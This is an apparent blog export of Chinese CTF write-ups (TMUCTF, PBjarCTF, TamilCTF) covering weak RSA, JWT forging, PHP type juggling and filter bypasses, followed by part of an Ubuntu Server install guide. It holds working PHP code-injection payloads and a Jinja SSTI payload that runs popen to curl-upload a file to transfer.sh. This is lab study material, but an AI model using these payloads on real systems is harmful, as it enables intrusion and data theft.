<p><strong>flag:</strong> <code>TMUCTF&#123;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&#125;</code></p>
<h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><em>Just login and get the flag!</em></p>
<p><em><a href="http://185.235.41.189/">http://185.235.41.189</a></em></p>
<hr>
<p>访问<code>/robots.txt</code></p>
<pre><code class="php">if (isset($_GET[&quot;password&quot;])) &#123;
    if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;]) &#123;
        echo &quot;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&quot; . $flag;
    &#125; else &#123;
        echo &quot;Try harder!&quot;;
    &#125;
&#125;
</code></pre>
<p><code>==</code>是弱类型的比较,字符串在与数字比较前会自动转换为数字;<code>0e\d+</code>这种字符串会被解析为科学计数法的数字，0的多少次方都是零,所以<code>oe\d+</code> <code>==</code> <code>oe\d+</code>.</p>
<p>所以我们只要找到一个形如<code>oe\d+</code>且哈希后仍为<code>oe\d+</code>的字符串即可.</p>
<p>代码:</p>
<pre><code class="python">import hashlib

i = 0
while True:
    m = hashlib.md5()
    plain = f&#39;0e&#123;i&#125;&#39;
    m.update(plain.encode(&#39;utf-8&#39;))
    t = m.hexdigest()
    if t[:2] == &#39;0e&#39; and t[2:].isdigit():
        print(plain, t)
        break
    i += 1
    if not i % 10000:
        print(i)
</code></pre>
<p><code>md5(&quot;0e215962017&quot;) == &quot;0e291242476940776845150308577824&quot;</code></p>
<p><strong>flag:</strong><code>TMUCTF&#123;D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?&#125;</code></p>
<h1 id="The-Devil-Never-Sleeps"><a href="#The-Devil-Never-Sleeps" class="headerlink" title="The Devil Never Sleeps"></a>The Devil Never Sleeps</h1><p><em>If you put the devil to sleep, you will get the flag successfully. Unfortunately, the devil never sleeps. But what if you use some sleeping pills?</em></p>
<p><em><a href="http://194.5.207.57:8080/">http://194.5.207.57:8080</a></em></p>
<hr>
<p>访问题目链接</p>
<pre><code>To get sleeping pills, navigate to /sleepingpill. To get the flag, navigate to /flag.
</code></pre>
<p>访问<code>/sleepingpill</code>得到<code>JWT</code>和<code>Public Key</code>,保存至<code>pub.key</code></p>
<pre><code class="ASN.1">-----BEGIN PUBLIC KEY-----
MIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD/////////////////////////
/////////////////////////////////////////////////////////////3//
///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ==
-----END PUBLIC KEY-----
</code></pre>
<p>访问<code>/flag</code></p>
<pre><code class="json">&#123;
   &quot;msg&quot;: &quot;Missing Pill Header&quot;
&#125;
</code></pre>
<p>加上<code>Pill</code>试试,可以看到是一个标准的<code>JWT</code>格式</p>
<pre><code class="json">&#123;
    &quot;msg&quot;: &quot;Missing &#39;Bearer&#39; type in &#39;Pill&#39; header. Expected &#39;Pill: Bearer &lt;JWT&gt;&#39;&quot;
&#125;
</code></pre>
<p>在<a href="https://jwt.io/">jwt.io</a>上解析一下<code>JWT</code></p>
<p><img data-src="/../../CTF/TMUCTF2021/Web/assets/jwt-decoded.jpg" alt="jwt"></p>
<p>使用<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>生成私钥,保存至<code>private.pem</code></p>
<pre><code class="shell">python RsaCtfTool.py --publickey ./key.pub --private
</code></pre>
<pre><code class="ASN.1">-----BEGIN RSA PRIVATE KEY-----
MIICmwIBAAKBjgD/////////////////////////////////////////////////
/////////////////////////////////////3/////////////+AAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAECAwEAAQKBjSp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WA
Kn/VgCp/1YAqf9WAKn/VgCp/1YAqf9WAKn/VgCp/1YAqVVWqqlVVqqpVVaoAVf+q
AFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+qAFX/qgBV/6oAVf+q
AFX/qgBV/6oAVf+qAQJMf///////////////////////////////////////////
/////////////////////////////////////////////////////////wJCAf//
////////////////////////////////////////////////////////////////
////////////////////AkxVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWq
qlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqqVVWqqlVVqqpVVaqpAkIB
gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/gIB/f4CAf3+AgH9/
gIB/f4CAf3+AgH9/gIB/f38CTHve973ve973ve9773ve973ve973ve+973ve973v
e973vve973ve973ve9773ve973ve973ve+973ve973ve973vve973ve973ve970=
-----END RSA PRIVATE KEY-----
</code></pre>
<p>修改<code>payload</code>中的<code>sleep</code>为<code>true</code>和<code>exp</code>为<code>9999999999</code>,生成<code>JWT Token</code>并请求<code>/flag</code></p>
<p>代码:</p>
<pre><code class="Python">import jwt

with open(&#39;private.pem&#39;,&#39;r&#39;) as f:
    secret = f.read()
print(secret)

dic = &#123;
    &quot;fresh&quot;: False,
    &quot;iat&quot;: 1631241476,
    &quot;jti&quot;: &quot;4b30d7a8-256f-405e-9640-4278728a8602&quot;,
    &quot;type&quot;: &quot;access&quot;,
    &quot;sub&quot;: &quot;devil&quot;,
    &quot;nbf&quot;: 1631241476,
    &quot;exp&quot;: 9999999999,
    &quot;sleep&quot;: &quot;true&quot;,
    &quot;danger&quot;: &quot;true&quot;
&#125;
headers = &#123;
    &quot;typ&quot;: &quot;JWT&quot;,
    &quot;alg&quot;: &quot;RS256&quot;
&#125;
token = jwt.encode(dic, secret, headers=headers, algorithm=&#39;RS256&#39;)
print(token)
</code></pre>
<p><strong>flag:</strong><code>TMUCTF&#123;0h_51nn3rm4n_Wh3r3_Y0u_60nn4_Run_70?&#125;</code></p>
<h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><p><em>A fun visual cryptogr aphy tool will amaze your kids!</em></p>
<hr>
<p>题目中给出了两张灰度图<code>ciphered_message.png</code>和<code>secret.png</code>,先用<code>PIL</code>看一下图片中每个像素点的值,发现均为0或255.</p>
<pre><code class="python">from PIL import Image
im = Image.open(&#39;ciphered_message.png&#39;)
print(list(im.getdata()))
</code></pre>
<p>使用<code>PIL</code>合并两张图片即可.</p>
<pre><code class="Python">from PIL import Image

im = Image.open(&#39;ciphered_message.png&#39;)
im2 = Image.open(&#39;secret.png&#39;)
assert im.size == im2.size
size = im2.size
print(size)
print(im.mode)
data = [x for x in im.getdata()]
for index,x in enumerate(im2.getdata()):
    if x and data[index]:
        data[index] = 255
    else:
        data[index] = 0

im = Image.new(&#39;1&#39;,size)
im.putdata(data)
im.save(&#39;ans.png&#39;)
</code></pre>
<p><img data-src="/../../CTF/TMUCTF2021/Welcome/assets/ans.png" alt="TMUCTF"></p>
<p><strong>flag:</strong><code>TMUCTF&#123;W3_h0p3_y0u_3nj0y_7h15_c0mp371710n_4nd_7h4nk_y0u!&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TMUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PBjarCTF2021 Writeup</title>
    <url>/posts/2720124286/</url>
    <content><![CDATA[<h1 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h1><p><em>So this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don&#39;t know how to do this, Google is your best friend!!!</em></p>
<hr>
<p>给了一个文件<code>file.txt</code>,里面是一个16进制的数:</p>
<pre><code class="python">n = &#39;666c61677b6469735f69735f615f666c346767675f68317d&#39;
for i in range(0,len(n),2):
    print(chr(int(n[i:i+2],16)),end=&#39;&#39;)
</code></pre>
<p><strong>flag:</strong><code>flag&#123;dis_is_a_fl4ggg_h1&#125;</code></p>
<h1 id="Not-Baby"><a href="#Not-Baby" class="headerlink" title="Not_Baby"></a>Not_Baby</h1><p><em>Hmm.... What is this?</em></p>
<hr>
<pre><code class="python">from Crypto.Util.number import *
with open(&#39;flag.txt&#39;, &#39;rb&#39;) as g:
    flag = g.read().strip()

with open(&#39;nums.txt&#39;, &#39;r&#39;) as f:
    s = f.read().strip().split()
    a = int(s[0])
    b = int(s[1])
    c = int(s[2])

e = 65537
n = a**3+b**3-34*c**3
m = bytes_to_long(flag)
ct = pow(m, e, n)

print(&quot;n: &quot;, n)
print(&quot;e: &quot;, e)
print(&quot;ct: &quot;, ct)
</code></pre>
<p>在<a href="http://factordb.com/">factordb.com</a>上分解n,得到</p>
<pre><code class="python">n = 2^2 · 73 · 181 · 11411 · 235111 · 6546828737292350227122068012441477&lt;34&gt; · 61872434969046837223597248696590986360784288448775988338706090668799371&lt;71&gt;
</code></pre>
<p>继续尝试在<a href="http://factordb.com/">factordb.com</a>上分解后两个数,发现二者均为素数</p>
<p>选择两个以上的素数相乘得到n时,公钥、私钥、加解密与一般 RSA 相同。</p>
<p><code>φ(n)=(p1−1)(p2−1)(p3−1)...</code></p>
<p><strong>exp</strong></p>
<pre><code class="python">import gmpy2
from Crypto.Util.number import long2str
n = 57436275279999211772332390260389123467061581271245121044959385707165571981686310741298519009630482399016808156120999964
e = 65537
ct = 25287942932936198887822866306739577372124406139134641253461396979278534624726135258660588590323101498005293149770225633

ls = [2, 2, 73, 181, 11411, 235111, 6546828737292350227122068012441477, 61872434969046837223597248696590986360784288448775988338706090668799371]

phi = 1
for x in ls:
    phi *= (x-1)

d = gmpy2.invert(e, phi)
x = pow(ct, d, n)
print(long2str(x))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;f4ct0ring_s0000oo00000o00_h4rd&#125;</code></p>
<h1 id="ReallynotSecureAlgorithm"><a href="#ReallynotSecureAlgorithm" class="headerlink" title="ReallynotSecureAlgorithm"></a>ReallynotSecureAlgorithm</h1><p><em>Here&#39;s the obligatory problem!!!</em></p>
<hr>
<p>题目给了p,q,e,c的值,直接求d解密即可</p>
<pre><code class="python">from Crypto.Util.number import *
with open(&#39;flag.txt&#39;,&#39;rb&#39;) as f:
    flag = f.read().strip()
e=65537
p=getPrime(128)
q=getPrime(128)
n=p*q
m=bytes_to_long(flag)
ct=pow(m,e,n)

print (p)
print (q)
print (e)
print (ct)
</code></pre>
<p>代码:</p>
<pre><code class="python">from Crypto.Util.number import long2str
import gmpy2

p = 194522226411154500868209046072773892801
q = 288543888189520095825105581859098503663
e = 65537
c = 2680665419605434578386620658057993903866911471752759293737529277281335077856

n = p*q
phi = (p-1) * (q-1)
d = gmpy2.invert(e,phi)
x = pow(c,d,n)
print(long2str(x))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;n0t_to0_h4rd_rIt3_19290453&#125;</code></p>
<h1 id="TechLead"><a href="#TechLead" class="headerlink" title="TechLead"></a><strong>TechLead</strong></h1><p><em>Infamous YouTuber, and ex-Google &#x2F; ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address? Million Token: <a href="https://coinmarketcap.com/currencies/million/">https://coinmarketcap.com/currencies/million/</a> Flag format: flag{0.006942069420}</em></p>
<hr>
<p>访问题目中给出的链接，点击<code>Explores</code>-&gt;<code>Etherscan.io</code>,<a href="https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611#balances">https://etherscan.io/token/0x6b4c7a5e3f0b99fcd83e9c089bddd6c7fce5c611</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-0.png" alt="TechLead"></p>
<p>点击<code>Holders</code>,找到<code>TechLead </code>的<code>address</code>,0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-1.png" alt="TechLead"></p>
<p>访问<a href="https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4#analytics">https://etherscan.io/address/0x5922b0bbae5182f2b70609f5dfd08f7da561f5a4</a>,点击<code>analytics</code></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/TechLead-2.png" alt="TechLead-2"></p>
<p><strong>flag:</strong><code>flag&#123;1.4625790953780384&#125;</code></p>
<h1 id="miner"><a href="#miner" class="headerlink" title="miner"></a><strong>miner</strong></h1><p><em>Block #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block?</em></p>
<hr>
<p><a href="https://etherscan.io/block/11834380">https://etherscan.io/block/11834380</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/miner.png" alt="miner"></p>
<p><strong>flag:</strong><code>flag&#123;0xd224ca0c819e8e97ba0136b3b95ceff503b79f53&#125;</code></p>
<h1 id="readFlag1"><a href="#readFlag1" class="headerlink" title="readFlag1"></a>readFlag1</h1><p><em>The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD#code">https://ropsten.etherscan.io/address/0xf0674CD7D1C0c616063a786E7d1434340E09BadD</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag1.png" alt="readFlag1"></p>
<p><strong>flag:</strong><code>flag&#123;etherscan_S0urc3_c0de&#125;</code></p>
<h1 id="readFlag2"><a href="#readFlag2" class="headerlink" title="readFlag2"></a>readFlag2</h1><p><em>I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to &quot;get()&quot; the flag. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866#internaltx">https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag2-0.png" alt="assets/readFlag2-0.png"></p>
<p>点击Internal Texs,访问第一个<code>Contract</code></p>
<p><a href="https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151#code">https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151</a></p>
<p>点击<code>Read Contract</code></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag2.png" alt="readFlag2"></p>
<p><strong>flag:</strong><code>flag&#123;web3js_plus_ABI_equalls_flag&#125; </code></p>
<h1 id="readFlag3"><a href="#readFlag3" class="headerlink" title="readFlag3"></a>readFlag3</h1><p><em>0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A. Important: This smart contract is on Ropsten</em></p>
<hr>
<p><a href="https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code">https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code</a></p>
<p><img data-src="/../../CTF/PBjarCTF2021/Misc/assets/readFlag3.png" alt="image-20210923154202557"></p>
<p><strong>flag:</strong><code>flag&#123;s3t_by_c0nstructor&#125;</code></p>
<h1 id="ProgrammersHateProgramming"><a href="#ProgrammersHateProgramming" class="headerlink" title="ProgrammersHateProgramming"></a>ProgrammersHateProgramming</h1><p><em>just a little different than normally. Link: <a href="http://147.182.172.217:42002/index.php">http://147.182.172.217:42002/index.php</a></em></p>
<hr>
<pre><code class="php">&lt;?php
if(isset($_POST[&quot;notewrite&quot;]))
&#123;
    $newnote = $_POST[&quot;notewrite&quot;];
    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);
    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;script&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $filename = generateRandomString();
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
</code></pre>
<p><strong>payload</strong></p>
<pre><code class="php">&lt;?php&lt;?php
 echo `cat /flagflag.php`;
?&gt;?&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we&#39;re_developing_a_really_meaningful_connection&#125;</code></p>
<h1 id="ProgrammersHateProgramming-2"><a href="#ProgrammersHateProgramming-2" class="headerlink" title="ProgrammersHateProgramming 2"></a>ProgrammersHateProgramming 2</h1><p><em>oh noes now there are more filters :(( Link: <a href="http://147.182.172.217:42007/">http://147.182.172.217:42007/</a></em></p>
<hr>
<pre><code class="php">&lt;?php
if(isset($_POST[&quot;notewrite&quot;]))
&#123;
    $newnote = $_POST[&quot;notewrite&quot;];
    $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote);
    $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd);

    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;ls&quot;, &quot;&quot;, $notetoadd);
    $notetoadd = str_replace(&quot;ZeroDayTea is not hot&quot;, &quot;&quot;, $notetoadd);

    $filename = generateRandomString();
    file_put_contents(&quot;$filename.php&quot;, $notetoadd);
    header(&quot;location:index.php&quot;);
&#125;
?&gt;
</code></pre>
<p><strong>payload</strong></p>
<pre><code class="php">&lt;?php&lt;?&lt;?php
 echo `sort /flagflag.php`;
?&gt;?&gt;
</code></pre>
<p><strong>flag:</strong><code>flag&#123;wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)&#125;</code></p>
<h1 id="cOrL"><a href="#cOrL" class="headerlink" title="cOrL"></a>cOrL</h1><p><em>Descriptions are hard give me a break. (Think of common usernames and passwords for admin) Link: <a href="http://147.182.172.217:42003/">http://147.182.172.217:42003/</a></em></p>
<hr>
<p>访问题目给出的链接，是一个简单的登录表单。用<code>admin:admin</code>登录</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Web/assets/corl2.png" alt="cOrL"></p>
<p>使用Burp Suitel拦截请求，将HTTP请求方式修改为<code>Put</code>即可:</p>
<p><img data-src="/../../CTF/PBjarCTF2021/Web/assets/corl20-flag.png" alt="image-20210923170425418"></p>
<p><strong>flag:</strong><code>flag&#123;HTTP_r3qu35t_m3th0d5_ftw&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PBjarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TamilCTF2021 Writeup</title>
    <url>/posts/2827311957/</url>
    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="../../CTF/TamilCTF2021/Web/images/login.png" alt="Open Flag" style="zoom:80%;" /><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;" /></p>
<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;
</code></pre>
<p><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/">transfer.sh</a></p>
<pre><code class="python">&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()&#125;&#125;
</code></pre>
<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="/../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
<img data-src="../../CTF/TamilCTF2021/Web/images/flag.jpg" alt="Open Flag" style="zoom:80%;" />

<p><strong>flag:</strong><code>TamilCTF&#123;SsTi_Is_VeRy_DaNgErOuS&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TamilCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkServer RD650安装Ubuntu Server 16.04</title>
    <url>/posts/560540611/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
<li>在Ubuntu官网上下载Ubuntu Server 16.04的ISO镜像(<a href="http://releases.ubuntu.com/16.04/">下载链接</a>)；</li>
<li>使用刻录软件(如:软碟通)将iso镜像文件写入U盘中，制成启动盘；</li>
<li>将ISO镜像文件拷贝至U盘的根目录，为了方便后续操作，这里可将镜像文件重命名为<code>Ubuntu.iso</code>；<span id="more"></span></li>
</ol>
<h2 id="设置引导"><a href="#设置引导" class="headerlink" title="设置引导"></a>设置引导</h2><ol>
<li>按电源键开机，启动服务器(服务器启动可能会比较缓慢)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134039.jpg)</li>
<li>出现此界面时，按&quot;F10&quot;进入TDM(ThinkServer Deployment Manager)；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134100.jpg)</li>
<li>进入TDM后，选择&quot;BIOS Setup(BIOS 设置)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134421.jpg)</li>
<li>选择&quot;Boot Manager(引导管理)&quot;,将&quot;Boot Mode(引导模式)&quot;改为&quot;UEFI Only(仅UEFI模式)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134519.jpg)</li>
<li>点击&quot;Save &amp; Reset(保存 &amp; 重启)&quot;,在弹出的对话框中选择&quot;Yes(是)&quot;重启电脑。如果出现如下对话框，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724134545.jpg)</li>
</ol>
<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ol>
<li>将U盘插入服务器后的USB插槽中，重启服务器，进入下图所示界面。选择&quot;Install Ubuntu Server(安装Ubuntu服务器版)&quot;；<br>注:若无法进入下图所示界面，请进入BIOS修改U盘为第一启动项。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165615.jpg)</li>
<li>选择安装过程和系统的默认语言为&quot;English(英语)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165649.jpg)</li>
<li>&quot;Select your location(选择你的区域)&quot;，这里选择&quot;Other(其他)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153430.jpg)</li>
<li>&quot;Continent or region(大陆或地区)&quot;选择&quot;Asia(亚洲)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153439.jpg)</li>
<li>&quot;Country(国家)&quot;选择&quot;China(中国)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153448.jpg)</li>
<li>是否通过一系列的按键检测键盘布局，选择&quot;NO(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165712.jpg)</li>
<li>字符集编码选择&quot;United States -en_US.UTF-8&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724153454.jpg)</li>
<li>&quot;Country or Region for the keyboard(键盘布局所属国家或地区)&quot;,选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165717.jpg)</li>
<li>&quot;Keyboard layout(键盘布局)&quot;，选择&quot;English(US)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165725.jpg)</li>
<li>稍等片刻，将会显示出现错误,原因为:安装程序未检测到CD-ROM。是否重试，选择&quot;No(否)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165744.jpg)</li>
<li>进入如下界面，选择&quot;Execute a shell(运行shell)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165801.jpg)</li>
<li>在shell中依次输入如下命令:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /dev/sd*</span><br><span class="line">umount /dev/sdb4/</span><br><span class="line">mkdir udev</span><br><span class="line">mount /dev/sdb4 /udev</span><br><span class="line">mount /udev/ubuntu.iso /cdrom</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
一般会出现两个<code>/dev/sdb*</code>项，我们选择带数字的那一项去替换上面代码中的<code>/dev/sdb4</code>;<br><code>ubuntu.iso</code>为U盘中Ubuntu Server的ISO镜像的文件名&quot;。<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165911.jpg)</li>
<li>进入如下界面后，选择&quot;Detect and mount CD-ROM(探测并挂载光盘)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg)</li>
<li>进入如下界面，选择&quot;Network interface(网络接口)&quot;，这里选择第一个网络接口，等待安装程序自动完成配置；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg)</li>
<li>设置&quot;Hostname(主机名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg)</li>
<li>设置&quot;Full name for the new user(新用户的全名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg)</li>
<li>设置&quot;Username for your account(你账号的用户名)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg)</li>
<li>设置&quot;password for the new user(新用户的密码)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg)</li>
<li>如果所设置的密码较为简单，可能会弹出如下对话框，询问你是否使用一个&quot;weak password(弱口令)&quot;，选择&quot;Yes(是)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg)</li>
<li>出现如下界面，询问你是否&quot;Encrypt your home directory(加密你的主目录)&quot;；<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg)</li>
